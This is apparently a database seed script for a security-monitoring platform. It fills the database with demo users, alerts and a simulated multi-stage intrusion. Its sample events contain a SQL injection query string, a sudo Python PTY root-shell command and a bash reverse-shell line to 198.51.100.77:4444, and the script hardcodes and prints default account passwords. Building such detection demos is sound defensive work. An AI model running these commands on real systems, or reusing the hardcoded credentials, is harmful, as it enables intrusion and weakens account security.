import asyncio
import os
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Add backend directory to sys.path
backend_path = Path(__file__).parents[1] / "backend"
sys.path.insert(0, str(backend_path))

from app.core.security import get_password_hash
from app.db.base import Base
from app.db.session import AsyncSessionLocal, engine, init_db
from app.detection.rule_loader import RuleLoader
from app.models.alert import Alert
from app.models.audit_log import AuditLog
from app.models.detection_rule import DetectionRule
from app.models.event import Event
from app.models.incident import Incident
from app.models.user import User

async def seed():
    print("[*] Initializing database tables...")
    await init_db()

    async with AsyncSessionLocal() as db:
        # Check if already seeded
        from sqlalchemy import select
        existing_users = await db.execute(select(User))
        if existing_users.scalars().first():
            print("[+] Database already contains users. Skipping duplicate seeding.")
            return

        # 1. Seed Users
        print("[*] Seeding default SOC users...")
        users = [
            User(
                email="admin@eye.security",
                username="admin",
                full_name="SOC Administrator",
                role="admin",
                is_active=True,
                hashed_password=get_password_hash("EyeAdmin2026!Secure")
            ),
            User(
                email="senior@eye.security",
                username="senior_analyst",
                full_name="Elena Rostova (Senior SOC Analyst)",
                role="senior_analyst",
                is_active=True,
                hashed_password=get_password_hash("EyeSenior2026!Secure")
            ),
            User(
                email="analyst@eye.security",
                username="analyst",
                full_name="Alex Rivera (Lead SOC Analyst)",
                role="soc_analyst",
                is_active=True,
                hashed_password=get_password_hash("EyeAnalyst2026!Secure")
            ),
            User(
                email="viewer@eye.security",
                username="viewer",
                full_name="Dana Vance (Security Auditor)",
                role="viewer",
                is_active=True,
                hashed_password=get_password_hash("EyeViewer2026!Secure")
            )
        ]
        for u in users:
            db.add(u)
        await db.flush()

        admin_user = users[0]
        analyst_user = users[2]

        # 2. Seed Detection Rules
        print("[*] Seeding Detection Rules...")
        backend_rules_path = backend_path / "app" / "detection" / "rules"
        loaded_rules = RuleLoader.load_rules_from_dir(str(backend_rules_path))
        
        for r in loaded_rules:
            db_rule = DetectionRule(
                rule_id=r.rule_id,
                name=r.name,
                description=r.description,
                severity=r.severity,
                confidence=r.confidence,
                enabled=r.enabled,
                version=r.version,
                category=r.category,
                mitre_tactic=r.mitre_tactic,
                mitre_technique=r.mitre_technique,
                yaml_content=r.yaml_content
            )
            db.add(db_rule)
        await db.flush()

        # 3. Seed Realistic Multi-Stage Attack Telemetry & Events
        print("[*] Seeding security events...")
        now = datetime.now(timezone.utc)
        
        events_data = [
            # Normal events
            ("linux-auth", "server-prod-01", "10.0.0.12", None, "ubuntu", "auth_success", "info",
             "SSH authentication successful for user 'ubuntu' from 10.0.0.12",
             "Aug 18 20:10:01 server-prod-01 sshd[102]: Accepted publickey for ubuntu from 10.0.0.12 port 51221 ssh2", {}),
            ("nginx", "web-lb-01", "192.168.1.45", None, None, "web_access", "info",
             "GET /api/v1/health returned 200 from 192.168.1.45",
             '192.168.1.45 - - [18/Aug/2026:20:12:00 +0000] "GET /api/v1/health HTTP/1.1" 200 45 "-" "curl/7.88.1"', {}),
             
            # Reconnaissance & Web Attacks
            ("nginx", "web-lb-01", "198.51.100.77", None, None, "port_scan", "medium",
             "Rapid port probe sequence detected from 198.51.100.77",
             "Aug 18 20:15:00 web-lb-01 firewall[401]: DROP TCP 198.51.100.77:48122 -> 10.0.1.5:8080 SYN", {}),
            ("nginx", "web-lb-01", "198.51.100.77", None, None, "sql_injection_attempt", "high",
             "GET /search?q=admin'+UNION+SELECT+1,2,password+FROM+users-- returned 403 from 198.51.100.77",
             '198.51.100.77 - - [18/Aug/2026:20:18:22 +0000] "GET /search?q=admin\'+UNION+SELECT+1,2,password+FROM+users-- HTTP/1.1" 403 120 "-" "sqlmap/1.7.2"', {}),

            # SSH Brute Force Campaign (5 failed attempts)
            ("linux-auth", "db-cluster-01", "198.51.100.77", None, "root", "auth_failure", "medium",
             "SSH authentication failure for user 'root' from 198.51.100.77",
             "Aug 18 20:25:10 db-cluster-01 sshd[3312]: Failed password for invalid user root from 198.51.100.77 port 39100 ssh2", {}),
            ("linux-auth", "db-cluster-01", "198.51.100.77", None, "admin", "auth_failure", "medium",
             "SSH authentication failure for user 'admin' from 198.51.100.77",
             "Aug 18 20:25:15 db-cluster-01 sshd[3314]: Failed password for invalid user admin from 198.51.100.77 port 39102 ssh2", {}),
            ("linux-auth", "db-cluster-01", "198.51.100.77", None, "postgres", "auth_failure", "medium",
             "SSH authentication failure for user 'postgres' from 198.51.100.77",
             "Aug 18 20:25:20 db-cluster-01 sshd[3316]: Failed password for invalid user postgres from 198.51.100.77 port 39104 ssh2", {}),
            ("linux-auth", "db-cluster-01", "198.51.100.77", None, "oracle", "auth_failure", "medium",
             "SSH authentication failure for user 'oracle' from 198.51.100.77",
             "Aug 18 20:25:25 db-cluster-01 sshd[3318]: Failed password for invalid user oracle from 198.51.100.77 port 39106 ssh2", {}),
            ("linux-auth", "db-cluster-01", "198.51.100.77", None, "deploy", "auth_failure", "medium",
             "SSH authentication failure for user 'deploy' from 198.51.100.77",
             "Aug 18 20:25:30 db-cluster-01 sshd[3320]: Failed password for user deploy from 198.51.100.77 port 39108 ssh2", {}),

            # Lateral Sudo Escalation & Reverse Shell Execution
            ("linux-auth", "db-cluster-01", "10.0.0.88", None, "deploy", "privilege_escalation", "high",
             "User 'deploy' executed sudo as 'root': /usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
             "Aug 18 20:30:12 db-cluster-01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", {}),
            ("custom", "db-cluster-01", "198.51.100.77", None, "root", "suspicious_process", "critical",
             "Reverse shell execution detected: /bin/bash -i >& /dev/tcp/198.51.100.77/4444 0>&1",
             '{"host":"db-cluster-01","process":"/bin/bash -i >& /dev/tcp/198.51.100.77/4444 0>&1","pid":8819,"user":"root","event_type":"suspicious_process","severity":"critical"}', {})
        ]

        event_models = []
        for i, ev in enumerate(events_data):
            src, host, s_ip, d_ip, user, ev_type, sev, msg, raw, meta = ev
            event_ts = now - timedelta(minutes=(len(events_data) - i) * 3)
            db_ev = Event(
                event_id=f"evt-seed-{i:03d}",
                timestamp=event_ts,
                source=src,
                host=host,
                source_ip=s_ip,
                destination_ip=d_ip,
                username=user,
                event_type=ev_type,
                severity=sev,
                message=msg,
                raw_event=raw,
                meta_info=meta
            )
            db.add(db_ev)
            event_models.append(db_ev)

        await db.flush()

        # 4. Seed Alerts
        print("[*] Seeding correlated security alerts...")
        alert1 = Alert(
            alert_id="ALT-AUTH-001",
            rule_id="EYE-RULE-AUTH-001",
            rule_name="SSH Brute Force Attack",
            timestamp=now - timedelta(minutes=15),
            severity="high",
            confidence=0.92,
            source="linux-auth",
            host="db-cluster-01",
            source_ip="198.51.100.77",
            username="deploy",
            status="investigating",
            description="5 failed SSH attempts within 30 seconds from 198.51.100.77 targeting db-cluster-01",
            evidence={
                "triggered_by_event_id": event_models[8].event_id,
                "mitre_tactic": "TA0001 - Initial Access",
                "mitre_technique": "T1110.001 - Password Guessing",
                "attacker_ip": "198.51.100.77"
            },
            analyst_notes="Multiple standard accounts tested in rapid succession. High likelihood of automated dictionary probe.",
            assigned_to_id=analyst_user.id
        )

        alert2 = Alert(
            alert_id="ALT-EP-001",
            rule_id="EYE-RULE-EP-001",
            rule_name="Sudo Root Privilege Escalation",
            timestamp=now - timedelta(minutes=10),
            severity="high",
            confidence=0.90,
            source="linux-auth",
            host="db-cluster-01",
            source_ip="10.0.0.88",
            username="deploy",
            status="investigating",
            description="User 'deploy' invoked interactive Python PTY bash shell as root",
            evidence={
                "triggered_by_event_id": event_models[9].event_id,
                "mitre_tactic": "TA0004 - Privilege Escalation",
                "mitre_technique": "T1548.003 - Sudo and Sudo Caching"
            },
            analyst_notes="Sudo command invoked from unusual TTY pts/1 without matching change ticket.",
            assigned_to_id=analyst_user.id
        )

        alert3 = Alert(
            alert_id="ALT-EP-002",
            rule_id="EYE-RULE-EP-002",
            rule_name="Suspicious Reverse Shell / Process Spawn",
            timestamp=now - timedelta(minutes=5),
            severity="critical",
            confidence=0.96,
            source="custom",
            host="db-cluster-01",
            source_ip="198.51.100.77",
            username="root",
            status="new",
            description="Outbound TCP socket connection to 198.51.100.77:4444 spawned under /bin/bash",
            evidence={
                "triggered_by_event_id": event_models[10].event_id,
                "mitre_tactic": "TA0002 - Execution",
                "mitre_technique": "T1059.004 - Unix Shell"
            },
            analyst_notes="Direct C2 callback to the same external IP that executed brute force.",
            assigned_to_id=analyst_user.id
        )

        alert4 = Alert(
            alert_id="ALT-WEB-001",
            rule_id="EYE-RULE-WEB-001",
            rule_name="SQL Injection (SQLi) Attempt",
            timestamp=now - timedelta(minutes=22),
            severity="high",
            confidence=0.94,
            source="nginx",
            host="web-lb-01",
            source_ip="198.51.100.77",
            username=None,
            status="acknowledged",
            description="UNION SELECT injection payload detected on web-lb-01",
            evidence={
                "triggered_by_event_id": event_models[3].event_id,
                "mitre_tactic": "TA0001 - Initial Access",
                "mitre_technique": "T1190 - Exploit Public-Facing Application"
            },
            analyst_notes="Web application firewall blocked the payload with 403 Forbidden."
        )

        for a in [alert1, alert2, alert3, alert4]:
            db.add(a)
        await db.flush()

        # 5. Seed Correlated Incident
        print("[*] Seeding multi-stage incident...")
        incident = Incident(
            incident_id="INC-CAMPAIGN-001",
            title="Active Multi-Stage Compromise Campaign on db-cluster-01",
            description="Coordinated cyber attack sequence beginning with external reconnaissance/brute force, progressing to sudo privilege escalation, and culminating in interactive reverse shell execution.",
            severity="critical",
            status="investigating",
            lead_analyst_id=analyst_user.id,
            timeline_summary="T0: Port & SQLi scan -> T+10m: SSH Brute Force -> T+15m: Account Compromise -> T+20m: Sudo Root Escalation -> T+25m: C2 Reverse Shell Callback.",
            ai_analysis={
                "summary": "Full cyber kill chain progression detected on database cluster db-cluster-01 originating from external adversary IP 198.51.100.77.",
                "root_cause": "Adversary successfully guessed deploy user credential, abused sudoers configuration to spawn root shell, and initiated outbound C2 socket.",
                "mitre_mapping": [
                    "TA0001 - Initial Access", "T1110.001 - Password Guessing",
                    "TA0004 - Privilege Escalation", "T1548.003 - Sudo Caching",
                    "TA0002 - Execution", "T1059.004 - Unix Shell",
                    "TA0011 - Command and Control", "T1071.001 - Web Protocols"
                ],
                "threat_hypothesis": "Targeted intrusion aimed at database exfiltration. Threat actor has established root persistence.",
                "recommended_actions": [
                    "URGENT: Quarantine db-cluster-01 at network gateway to terminate C2 socket",
                    "Kill process PID 8819 and inspect parent process hierarchy",
                    "Rotate deploy user credentials and all database connection strings",
                    "Block 198.51.100.77 permanently at edge firewall"
                ],
                "confidence": 0.96,
                "prompt_shield_status": "Shield Active: Boundary Enforced (No Injection Detected)"
            },
            root_cause="Credential compromise of unprivileged account followed by sudo privilege abuse.",
            mitigation_steps=[
                "Isolate db-cluster-01 from internal VPC",
                "Terminate rogue reverse shell process PID 8819",
                "Blacklist attacker IP 198.51.100.77 on edge routers",
                "Audit database transaction logs for data exfiltration"
            ],
            analyst_notes="Tier 2 escalation in progress. Incident commander assigned."
        )
        db.add(incident)
        await db.flush()

        # Link alerts 1, 2, 3 to incident
        alert1.incident_id = incident.id
        alert2.incident_id = incident.id
        alert3.incident_id = incident.id

        # 6. Seed Audit Logs
        print("[*] Seeding security audit logs...")
        audit_entries = [
            AuditLog(
                user_id=admin_user.id,
                username=admin_user.username,
                ip_address="10.0.0.5",
                action="USER_LOGIN",
                resource_type="auth",
                resource_id=admin_user.id,
                details={"role": "admin"},
                status="SUCCESS"
            ),
            AuditLog(
                user_id=analyst_user.id,
                username=analyst_user.username,
                ip_address="10.0.0.18",
                action="UPDATE_ALERT",
                resource_type="alert",
                resource_id=alert1.alert_id,
                details={"status": "investigating"},
                status="SUCCESS"
            ),
            AuditLog(
                user_id=analyst_user.id,
                username=analyst_user.username,
                ip_address="10.0.0.18",
                action="CREATE_INCIDENT",
                resource_type="incident",
                resource_id=incident.incident_id,
                details={"title": incident.title, "severity": incident.severity},
                status="SUCCESS"
            )
        ]
        for entry in audit_entries:
            db.add(entry)

        await db.commit()
        print("\n" + "="*60)
        print(" [SUCCESS] PROJECT EYE DATABASE SEEDING COMPLETED SUCCESSFULLY!")
        print("="*60)
        print(" Default Accounts:")
        print("  - Admin:   admin@eye.security   / EyeAdmin2026!Secure")
        print("  - Analyst: analyst@eye.security / EyeAnalyst2026!Secure")
        print("  - Viewer:  viewer@eye.security  / EyeViewer2026!Secure")
        print("="*60)

if __name__ == "__main__":
    asyncio.run(seed())
